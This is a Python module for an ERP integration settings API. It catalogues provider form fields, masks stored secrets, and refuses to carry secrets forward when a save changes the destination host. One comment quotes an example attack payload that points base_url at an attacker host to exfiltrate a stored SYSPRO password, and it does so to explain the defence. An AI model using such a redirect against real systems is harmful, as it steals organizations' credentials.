"""The ERP provider catalogue: what Organization → ERP offers and asks for.

The single source of truth for the ERP setup form. ``GET
/api/organization/erp/providers`` serves it, and the page renders one dropdown
entry and one set of inputs per entry. Before it, the page carried its own
hardcoded ``ERP_TYPES`` list of mostly enterprise ERPs, most of which had no
direct adapter, so choosing one fell silently into a generic form or Merge.dev.

It is also the authority for **which ``settings.erp`` keys are secrets**.
Every field marked ``secret`` here, plus :data:`EXTRA_SECRET_KEYS`, is
write-only: :func:`mask_erp_config` replaces a stored value with
:data:`SECRET_MASK` on every read, and :func:`merge_erp_update` keeps the stored
value when a save sends it back blank or masked, but only while the save still
names the same ERP at the same destination (:data:`DESTINATION_KEYS`).
``settings.erp.oauth`` (the
token block ``services/erp_oauth`` writes) is never readable and never writable
through the settings API: reads see ``{"connected": bool}``, writes keep the
stored block.

Pure: no DB, no request, no I/O. ``tests/test_erp_catalog.py`` keeps it in step
with the adapter registry.
"""

from __future__ import annotations

from copy import deepcopy
from typing import Any

#: What a read shows in place of a stored secret, and what a save may send
#: back to mean "keep the stored one".
SECRET_MASK = "********"

#: The OAuth token block. Its only writer is ``services/erp_oauth``.
OAUTH_KEY = "oauth"

#: The routing value for the Merge.dev unified API, and the direct one.
METHOD_MERGE_DEV = "merge_dev"
METHOD_DIRECT = "direct"


#: Field names the form already had a translated label for. Every other field
#: is labelled ``org.erp.field.<name>``. ``tests/test_erp_catalog.py`` checks
#: each key exists in the frontend's English catalogue.
_EXISTING_LABEL_KEYS: dict[str, str] = {
    "base_url": "org.erp.baseUrl",
    "environment": "org.erp.environment",
    "tenant_id": "org.erp.tenantId",
    "client_id": "org.erp.clientId",
    "client_secret": "org.erp.clientSecret",
    "company_id": "org.erp.companyId",
    "account_id": "org.erp.accountId",
    "consumer_key": "org.erp.consumerKey",
    "consumer_secret": "org.erp.consumerSecret",
    "token_id": "org.erp.tokenId",
    "token_secret": "org.erp.tokenSecret",
}


def _field(
    name: str,
    *,
    secret: bool = False,
    required: bool = True,
    placeholder: str | None = None,
    help_key: str | None = None,
    label_key: str | None = None,
    options: list[str] | None = None,
) -> dict[str, Any]:
    """One form field. ``label_key`` is a frontend i18n ``MessageKey``."""
    out: dict[str, Any] = {
        "name": name,
        "label_key": label_key or _EXISTING_LABEL_KEYS.get(name, f"org.erp.field.{name}"),
        "secret": secret,
        "required": required,
    }
    if placeholder is not None:
        out["placeholder"] = placeholder
    if help_key is not None:
        out["help_key"] = help_key
    if options is not None:
        out["options"] = options
    return out


#: The bring-your-own-app pair an OAuth provider accepts. Optional: without
#: it ``services/erp_oauth`` uses the platform's own app (``FEOH_`` settings).
def _byo_app_fields() -> list[dict[str, Any]]:
    return [
        _field("client_id", required=False, help_key="org.erp.help.byoApp"),
        _field("client_secret", secret=True, required=False),
    ]


#: Sage Intacct's REST API, client-credentials grant. Kept as one list so the
#: field names can be changed in one place to match the adapter.
SAGE_INTACCT_FIELDS: list[dict[str, Any]] = [
    _field("client_id"),
    _field("client_secret", secret=True),
    _field("company_id"),
    _field("user_id"),
    _field("location_id", required=False, help_key="org.erp.help.intacctLocation"),
    _field("po_document_type", required=False, placeholder="Purchase Order"),
]

#: Every direct ERP, in dropdown order within its region group.
ERP_PROVIDERS: list[dict[str, Any]] = [
    {
        "key": "quickbooks_online",
        "label": "QuickBooks Online",
        "regions": ["US"],
        "auth": "oauth",
        "fields": [
            *_byo_app_fields(),
            _field("environment", options=["production", "sandbox"], placeholder="production"),
        ],
        "docs_url": "https://developer.intuit.com/app/developer/qbo/docs/get-started",
    },
    {
        "key": "xero",
        "label": "Xero",
        "regions": ["US", "ZA"],
        "auth": "oauth",
        "fields": [
            *_byo_app_fields(),
            _field(
                "bill_status",
                required=False,
                options=["AUTHORISED", "DRAFT"],
                help_key="org.erp.help.xeroBillStatus",
            ),
            _field("default_tax_type", required=False),
        ],
        "docs_url": "https://developer.xero.com/documentation/getting-started-guide/",
    },
    {
        # Sage's v3.1 API: US, UK, IE and CA, not South Africa (see below).
        "key": "sage_accounting",
        "label": "Sage Business Cloud Accounting",
        "regions": ["US"],
        "auth": "oauth",
        "fields": [
            *_byo_app_fields(),
            _field("default_tax_rate_id", required=False),
            _field("void_reason", required=False),
        ],
        "docs_url": "https://developer.sage.com/accounting/",
    },
    {
        # South Africa runs on Sage's own regional API, with an API key plus
        # the Sage login, not the v3.1 OAuth app.
        "key": "sage_accounting_za",
        "label": "Sage Business Cloud Accounting (South Africa)",
        "regions": ["ZA"],
        "auth": "credentials",
        "fields": [
            _field("api_key", secret=True),
            _field("username", help_key="org.erp.help.sageZaUsername"),
            _field("password", secret=True),
            _field("company_id"),
            # The API reports currency only as numeric ids, so this is the one
            # place an ISO code for the company's own currency comes from.
            _field("home_currency", required=False, placeholder="ZAR"),
            # Only a Sage partner reaches another host; blank uses the adapter's
            # default, Sage's South African API (``DEFAULT_API_BASE``).
            _field(
                "base_url",
                required=False,
                placeholder="https://accounting.sageone.co.za/api/2.0.0",
                help_key="org.erp.help.sageZaBaseUrl",
            ),
        ],
        "docs_url": "https://accounting.sageone.co.za/api/2.0.0/Help",
    },
    {
        "key": "blackbaud_fe_nxt",
        "label": "Blackbaud Financial Edge NXT",
        "regions": ["US"],
        "auth": "oauth",
        "fields": [
            *_byo_app_fields(),
            # Blackbaud's SKY API subscription key, sent with every call when
            # the tenant brings its own app.
            _field("subscription_key", secret=True, required=False),
            # The AP liability account each invoice's credit line posts to, and
            # the ledger's ISO currency; the adapter refuses without either.
            _field("ap_account_number"),
            _field("currency", placeholder="USD"),
            _field("project_id", required=False),
            _field("approval_status", required=False, options=["Pending", "Approved"]),
            # ``transaction_code_values`` (a list of {id, value}) is deliberately
            # not a form field: it has no single-input shape. An admin sets it
            # through the API, ``PATCH /api/organization`` with
            # ``settings.erp.transaction_code_values``. A save replaces the
            # block (``merge_erp_update``), so the settings form sends back
            # every stored key it does not render (frontend
            # ``buildErpPayload``), which is what keeps it across a form save.
        ],
        "docs_url": "https://developer.blackbaud.com/skyapi",
    },
    {
        "key": "sage_intacct",
        "label": "Sage Intacct",
        "regions": ["US", "ZA"],
        "auth": "credentials",
        "fields": SAGE_INTACCT_FIELDS,
        "docs_url": "https://developer.intacct.com/web-services/",
    },
    {
        "key": "netsuite",
        "label": "Oracle NetSuite",
        "regions": ["US", "ZA"],
        "auth": "credentials",
        "fields": [
            _field("account_id", placeholder="1234567"),
            _field("consumer_key"),
            _field("consumer_secret", secret=True),
            _field("token_id"),
            _field("token_secret", secret=True),
        ],
        "docs_url": "https://docs.oracle.com/en/cloud/saas/netsuite/ns-online-help/section_4247337262.html",
    },
    {
        "key": "dynamics_365_bc",
        "label": "Microsoft Dynamics 365 Business Central",
        "regions": ["US", "ZA"],
        "auth": "credentials",
        "fields": [
            _field(
                "base_url",
                required=False,
                placeholder="https://api.businesscentral.dynamics.com/v2.0",
            ),
            _field("environment", required=False, placeholder="production"),
            _field("tenant_id"),
            _field("client_id"),
            _field("client_secret", secret=True),
            _field("company_id"),
        ],
        "docs_url": "https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/api-reference/v2.0/",
    },
    {
        "key": "syspro",
        "label": "SYSPRO",
        "regions": ["ZA"],
        "auth": "credentials",
        "fields": [
            _field("base_url", placeholder="https://syspro.example.com/SYSPROWCFService/Rest"),
            _field("operator"),
            _field("operator_password", secret=True),
            _field("company_id"),
            _field("company_password", secret=True, required=False),
            _field("posting_period", required=False, placeholder="C"),
        ],
        "docs_url": "https://help.syspro.com/",
    },
]

#: The "Other ERP" choice: any ERP Merge.dev's unified API reaches. Scale plan
#: only (decisions §256): Merge bills per linked account above our Growth price.
MERGE_DEV_PROVIDER: dict[str, Any] = {
    "key": METHOD_MERGE_DEV,
    "label": "Other ERP via Merge.dev",
    "regions": [],
    "auth": "credentials",
    "plan": "scale",
    "fields": [
        _field("api_key", secret=True, label_key="org.erp.mergeApiKey", placeholder="test_..."),
        _field("account_token", secret=True, label_key="org.erp.accountToken"),
    ],
    "docs_url": "https://docs.merge.dev/accounting/",
}

#: The long tail Merge.dev reaches, offered as a second dropdown inside the
#: Merge.dev choice. Stored as ``settings.erp.type`` with
#: ``integration_method: merge_dev``.
MERGE_DEV_LONG_TAIL: list[dict[str, str]] = [
    {"value": "sap_s4hana", "label": "SAP S/4HANA"},
    {"value": "sap_business_one", "label": "SAP Business One"},
    {"value": "epicor", "label": "Epicor Kinetic"},
    {"value": "acumatica", "label": "Acumatica Cloud ERP"},
    {"value": "sage_x3", "label": "Sage X3"},
    {"value": "infor", "label": "Infor CloudSuite Industrial"},
    {"value": "qad", "label": "QAD Adaptive"},
    {"value": "cetec", "label": "Cetec ERP"},
    {"value": "delmiaworks", "label": "DELMIAWorks"},
    {"value": "myob", "label": "MYOB"},
    {"value": "freshbooks", "label": "FreshBooks"},
    {"value": "zoho_books", "label": "Zoho Books"},
    {"value": "other", "label": "Other"},
]

#: Catalogue keys whose adapter another branch is still building. The
#: registry test accepts these as unregistered; empty it as each adapter lands.
PENDING_ADAPTERS: frozenset[str] = frozenset()

#: ``settings.erp`` keys that are secrets but no form field names: the inbound
#: webhook's HMAC key (``api/erp_webhook``) and its older spelling.
EXTRA_SECRET_KEYS: frozenset[str] = frozenset({"webhook_signing_secret", "webhook_secret"})


def all_providers() -> list[dict[str, Any]]:
    """Every catalogue entry, the Merge.dev choice last."""
    return [*ERP_PROVIDERS, MERGE_DEV_PROVIDER]


def provider(key: str | None) -> dict[str, Any] | None:
    for entry in all_providers():
        if entry["key"] == key:
            return entry
    return None


#: Every key masked on read and kept on a blank save. A key name is a secret
#: for every provider once ANY provider marks it secret: the dispatcher reads
#: whichever it needs, so masking by name is the fail-closed direction.
SECRET_KEYS: frozenset[str] = frozenset(
    {f["name"] for entry in all_providers() for f in entry["fields"] if f["secret"]}
    | EXTRA_SECRET_KEYS
)


def catalog_key(erp_config: dict | None) -> str | None:
    """The catalogue entry a stored config selects (Merge.dev by its method)."""
    if not isinstance(erp_config, dict):
        return None
    if erp_config.get("integration_method", METHOD_MERGE_DEV) == METHOD_MERGE_DEV:
        return METHOD_MERGE_DEV
    return erp_config.get("type") or None


def oauth_connected(erp_config: dict | None) -> bool:
    """Does the stored config hold a completed OAuth consent?"""
    if not isinstance(erp_config, dict):
        return False
    block = erp_config.get(OAUTH_KEY)
    return isinstance(block, dict) and bool(block.get("refresh_token") or block.get("access_token"))


def mask_erp_config(erp_config: Any) -> Any:
    """``settings.erp`` as an admin may read it: secrets masked, tokens hidden.

    A stored secret reads as :data:`SECRET_MASK` (an empty one stays empty, so
    the form can tell "saved" from "never set"); the OAuth block reads as
    ``{"connected": bool}``. Returns a new dict; never mutates its input.
    """
    if not isinstance(erp_config, dict):
        return erp_config
    out: dict[str, Any] = {}
    for key, value in erp_config.items():
        if key == OAUTH_KEY:
            continue
        if key in SECRET_KEYS:
            out[key] = SECRET_MASK if value not in (None, "") else ""
        else:
            out[key] = deepcopy(value)
    if OAUTH_KEY in erp_config:
        out[OAUTH_KEY] = {"connected": oauth_connected(erp_config)}
    return out


def _is_blank(value: Any) -> bool:
    return value == SECRET_MASK or (isinstance(value, str) and not value.strip())


#: ``settings.erp`` keys that say WHERE the stored credentials are sent: the
#: host itself (``base_url``), or a value an adapter builds the host or the
#: target books from (NetSuite's ``account_id`` is a hostname label; Business
#: Central's ``tenant_id`` / ``environment`` / ``company_id`` are URL path
#: segments; QuickBooks' ``environment`` picks its API host; SYSPRO and Intacct
#: log in to ``company_id``). A save that changes any of them is a NEW
#: connection: a blank, masked or omitted secret is not carried forward and has
#: to be typed again (the inbound webhook key, :data:`EXTRA_SECRET_KEYS`, is
#: never sent outbound and so survives). Without this, ``{"type": "syspro", "base_url":
#: "https://attacker.tld", "operator_password": "********"}`` from an admin (or
#: a stolen admin token) sent the stored password to attacker.tld through
#: ``POST /organization/test-erp`` or a settings PATCH. A catalogue field that
#: names a host belongs here: ``tests/test_erp_catalog.py`` fails on any
#: ``*_url`` / ``*host*`` field left out.
DESTINATION_KEYS: frozenset[str] = frozenset(
    {"base_url", "tenant_id", "account_id", "company_id", "environment"}
)


def _destination_value(value: Any) -> Any:
    """A destination key's value for comparison: blank and absent are the same."""
    if isinstance(value, str):
        return value.strip() or None
    return value


def _same_erp(stored: Any, incoming: Any) -> bool:
    if not isinstance(stored, dict) or not isinstance(incoming, dict):
        return False
    return catalog_key(stored) == catalog_key(incoming) and stored.get("type") == incoming.get(
        "type"
    )


def same_connection(stored: Any, incoming: Any) -> bool:
    """Does ``incoming`` name the same ERP, at the same destination, as ``stored``?

    The one condition under which a stored secret may be carried into
    ``incoming`` (:func:`merge_erp_update`).
    """
    if not _same_erp(stored, incoming):
        return False
    return all(
        _destination_value(stored.get(key)) == _destination_value(incoming.get(key))
        for key in DESTINATION_KEYS
    )


def merge_erp_update(stored: Any, incoming: dict) -> dict:
    """The ``settings.erp`` block a save of ``incoming`` produces.

    * Non-secret keys come from ``incoming`` (the block is replaced, as before).
    * A secret sent blank, as :data:`SECRET_MASK`, or omitted keeps the stored
      value **only while** :func:`same_connection` holds: switching from
      Business Central to Xero must not carry one ERP's ``client_secret`` into
      the other's app credentials, and pointing SYSPRO at a new ``base_url``
      must not send the stored password to that host. An explicit ``null``
      clears it.
    * ``oauth`` is never taken from ``incoming``; the stored block is kept. Its
      tokens cannot follow a changed destination: adapters and the refresher
      read the stored block, bound to its provider and ``connection_id``
      (``services/erp_oauth``), and send it only to the provider's own hosts.
    """
    stored = stored if isinstance(stored, dict) else {}
    same_erp = _same_erp(stored, incoming)
    same_dest = same_erp and same_connection(stored, incoming)

    def carry(key: str) -> bool:
        # The inbound webhook's HMAC key is never sent anywhere — it verifies
        # what the ERP sends US — so a changed destination need not drop it.
        return bool(stored.get(key)) and (same_dest or (same_erp and key in EXTRA_SECRET_KEYS))

    merged: dict[str, Any] = {}
    for key, value in incoming.items():
        if key == OAUTH_KEY:
            continue
        if key in SECRET_KEYS:
            if value is None:
                continue
            if _is_blank(value):
                if carry(key):
                    merged[key] = stored[key]
                continue
        merged[key] = value
    for key in SECRET_KEYS:
        if key not in incoming and carry(key):
            merged[key] = stored[key]
    if OAUTH_KEY in stored:
        merged[OAUTH_KEY] = stored[OAUTH_KEY]
    return merged


def changed_keys(before: Any, after: dict) -> list[str]:
    """Names (never values) of the keys a save changed, for the audit row."""
    before = before if isinstance(before, dict) else {}
    return sorted(k for k in set(before) | set(after) if before.get(k) != after.get(k))
